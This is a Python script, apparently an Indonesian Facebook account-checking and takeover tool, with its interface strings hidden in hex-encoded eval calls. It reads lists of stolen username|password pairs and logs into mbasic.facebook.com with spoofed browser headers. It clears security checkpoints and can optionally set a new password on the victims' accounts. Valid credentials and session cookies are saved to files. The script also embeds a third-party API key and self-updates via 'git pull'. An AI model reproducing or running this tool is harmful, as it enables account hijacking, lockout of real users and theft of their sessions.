def jalan(keliling):
	for mau in keliling+'\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
ubah_pass=[]
pwbaru=[]
pwBaru=[]
ubahP=[]
def file_cp():
	dirs=os.listdir('CP')
	prints(Panel(eval(binascii.unhexlify(b'662222227b50327d636f7079206e616d612066696c6520686173696c20637261636b20646920626177616820696e69206b656d756469616e2070617374656b616e20646920626177616820756e74756b2063656b206f707369222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
	for file in dirs:
		prints(Panel(eval(binascii.unhexlify(b'662222227b4b327d7b2866696c65297d222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
	try:
		prints(Panel(eval(binascii.unhexlify(b'662222227b50327d636f7079206e616d612066696c652064692061746173206b656d756469616e2074656d70656c20646920626177616820696e6920636f6e746f68207b4d327d3a207b48327d7b77616b74757d2e747874222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		opsi()
	except IOError:
		prints(Panel(eval(binascii.unhexlify(b'662222227b4d327d546964616b206164612066696c6520756e74756b2064692063656b2073696c61686b616e20637261636b2064756c75222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		Menu().menu()
def opsi():
	CP=('CP/')
	romi=console.input(eval(binascii.unhexlify(b'6622207b55327d23207b50327d54656d70656c2061746175206d6173756b616e206e616d612066696c652079616e6720696e67696e2064692063656b20646973696e69203a2022').decode('8ftu'[::+-+-(-(+1))])))
	if romi=='':
		prints(Panel(eval(binascii.unhexlify(b'662222227b42327d6973692079616e672062656e6172222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		opsi()
	try:
		file_cp=open(CP+romi,'r').readlines()
	except IOError:
		exit(prints(Panel(eval(binascii.unhexlify(b'662222227b50327d6e616d612066696c657b4b327d207b28726f6d69297d207b50327d746964616b2064692074656d756b616e222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))])))))
	prints(Panel(eval(binascii.unhexlify(b'662222227b50327d736562656c656d206d656c616e6a75746b616e2068696475706b616e206d6f646520706573617761742073656c616d6120313020646574696b222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
	pw=console.input(eval(binascii.unhexlify(b'6622207b55327d23207b50327d756261682070617373776f7264206b6574696b61207461622079657320792f6e203a2022').decode('8ftu'[::+-+-(-(+1))])))
	if pw in['y','Y']:
		ubah_pass.append('ubah_sandi')
		pw2=console.input(eval(binascii.unhexlify(b'6622207b55327d23207b50327d4d6173756b616e2050617373776f72642062617275203a7b48327d2022').decode('8ftu'[::+-+-(-(+1))])))
		if len(pw2)<=5:
			prints(Panel(eval(binascii.unhexlify(b'662222227b50327d53616e6469206d696e696d616c2036206b6172616b746572222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		else:
			pwbaru.append(pw2)
	prints(Panel(eval(binascii.unhexlify(b'662222227b50327d546f74616c20616b756e207b4d327d3a7b48327d207b737472286c656e2866696c655f637029297d222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
	nomor=0
	for fb in file_cp:
		akun=fb.replace('\n','')
		ngecek=akun.split('|')
		nomor+=1
		prints(Panel(eval(binascii.unhexlify(b'662222227b50327d5b7b48327d7b28737472286e6f6d6f7229297d7b50327d5d207b50327d43656b207365736920616b756e207b42327d3e3d3e207b42327d7b616b756e7d222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))));jeda(0.1)
		try:
			mengecek(ngecek[0].replace('',''),ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print('\n')
	Console(width=30).print(Panel(eval(binascii.unhexlify(b'66225b626f6c6420677265656e5d53454c45534149204d454e474543454b204f50534922').decode('8ftu'[::+-+-(-(+1))])),style='red'),justify='left')
	console.input(eval(binascii.unhexlify(b'6622207b55327d23207b50327d54656b616e20456e74657222').decode('8ftu'[::+-+-(-(+1))])))
	Menu().menu()
data={}
data2={}
def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	ua='Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
	url='https://mbasic.facebook.com'
	session.headers.update({'Host':'mbasic.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','origin':'https://mbasic.facebook.com','content-type':'application/x-www-form-urlencoded','user-agent':ua,'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with':'mark.via.gp','sec-fetch-site':'same-origin','sec-fetch-mode':'navigate','sec-fetch-user':'?1','sec-fetch-dest':'document','referer':'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
	soup=bs4.BeautifulSoup(session.get(url+'/login/?next&ref=dbl&fl&refid=8').text,'html.parser')
	link=soup.find('form',{'method':'post'})
	for x in soup('input'):
		data.update({x.get('name'):x.get('value')})
	data.update({'email':user,'pass':pw})
	urlPost=session.post(url+link.get('action'),data=data)
	response=bs4.BeautifulSoup(urlPost.text,'html.parser')
	if 'c_user' in session.cookies.get_dict():
		if 'Akun Anda Dikunci' in urlPost.text:
			print('%(M,til))
		else:
			print('%(til,H))
			open('OK/OK-%s.txt'%(waktu),'a').write(' %s|%s\n' %(user,pw))
	elif 'checkpoint' in session.cookies.get_dict():
		coki=(';').join(['%s=%s' %(key,value)for key,value in session.cookies.get_dict().items()])
		title=re.findall('\\<title>(.*?)<\\/title>',str(response))
		link2=response.find('form',{'method':'post'})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response('input'):
			if x.get('name')in listInput:
				data2.update({x.get('name'):x.get('value')})
		an=session.post(url+link2.get('action'),data=data2)
		response2=bs4.BeautifulSoup(an.text,'html.parser')
		cek=[cek.text for cek in response2.find_all('option')]
		number=0
		print('%(U,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if 'Lihat detail login yang ditampilkan. Ini Anda?' in title:
				if 'ubah_sandi' in ubah_pass:
					dat,dat2={},{}
					but=['submit[Yes]','nh','fb_dtsg','jazoest','checkpoint_data']
					for x in response('input'):
						if x.get('name')in but:
							dat.update({x.get('name'):x.get('value')})
					ubahPw=session.post(url+link2.get('action'),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,'html.parser')
					link3=resUbah.find('form',{'method':'post'})
					but2=['submit[Next]','nh','fb_dtsg','jazoest']
					if 'Buat Kata Sandi Baru' in re.findall('\\<title>(.*?)<\\/title>',str(ubahPw)):
						for b in resUbah('input'):
							dat2.update({b.get('name'):b.get('value')})
						dat2.update({'password_new':''.join(pwbaru)})
						an=session.post(url+link3.get('action'),data=dat2)
						coki=(';').join(['%s=%s' %(key,value)for key,value in session.cookies.get_dict().items()])
						print('%(H,til,N,H,user,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu),'a').write('%s%s|%s|%s\n' %(H,user,pwbaru[0],coki))
				else:
					print('%(H,til))
					tree=Tree(' ',guide_style=eval(binascii.unhexlify(b'66227b636f6c6f725f6f6b7d22').decode('8ftu'[::+-+-(-(+1))])))
					tree.add(Panel(eval(binascii.unhexlify(b'66227b48327d7b75617d7b50327d22').decode('8ftu'[::+-+-(-(+1))])),width=83,padding=(0,2),style=eval(binascii.unhexlify(b'66227b636f6c6f725f6f6b7d22').decode('8ftu'[::+-+-(-(+1))]))))
					prints(tree)
					open('OK/OK-%s.txt' %(waktu),'a').write('%s %s|%s|%s\n' %(H,user,pw,coki))
			elif 'Masukkan Kode Masuk untuk Melanjutkan' in re.findall('\\<title>(.*?)<\\/title>',str(response)):
				print('%(M))
			else:
				print('%s%s[0mterjadi kesalahan'%(M,til))
		else:
			if 'c_user' in session.cookies.get_dict():
				print('%(H))
				open('OK/OK-%s.txt' %(waktu),'a').write('%s%s|%s\n' %(H,user,pw))
		for opsi in range(len(cek)):
			number+=1
			jalan('  %s%s. %s%s'%(P,str(number),K,cek[opsi]))
	elif 'login_error' in str(response):
		oh=run.find('div',{'id':'login_error'}).find('div').text
		print('%s %s'%(M,oh))
	else:
		tree=Tree(' ',guide_style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))])))
		tree.add(Panel(eval(binascii.unhexlify(b'66227b4f327d6c6f67696e20676167616c2c2073696c61686b616e2063656b206b656d62616c692069642064616e206b6174612073616e64697b50327d22').decode('8ftu'[::+-+-(-(+1))])),width=83,padding=(0,2),style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		prints(tree)
def scarpping_ua():
    url='https://api.apilayer.com/user_agent/generate?android=true&chrome=true'
    header={'apikey':'2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL'}
    try:
        response=requests.get(url,headers=header)
        if response.status_code==200:
            uascrap.append(response.json()['ua'])
        else:
            uascrap.append('Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36')
    except requests.exceptions.ConnectionError:
        uascrap.append('Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36')
class Session:
	def generate_ugent(self):
		ugent=eval(binascii.unhexlify(b'66224d6f7a696c6c612f352e3020284c696e75783b20416e64726f696420393b20534d2d53333637564c204275696c642f505052312e3138303631302e3031313b20777629204170706c655765624b69742f3533372e333620284b48544d4c2c206c696b65204765636b6f292056657273696f6e2f342e30204368726f6d652f37362e302e333830392e3839204d6f62696c65205361666172692f3533372e3336205b46425f4941422f4f7263612d416e64726f69643b464241562f3232322e302e302e31352e3132343b5d22').decode('8ftu'[::+-+-(-(+1))]))
		return ugent  
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass
	Menu().menu()
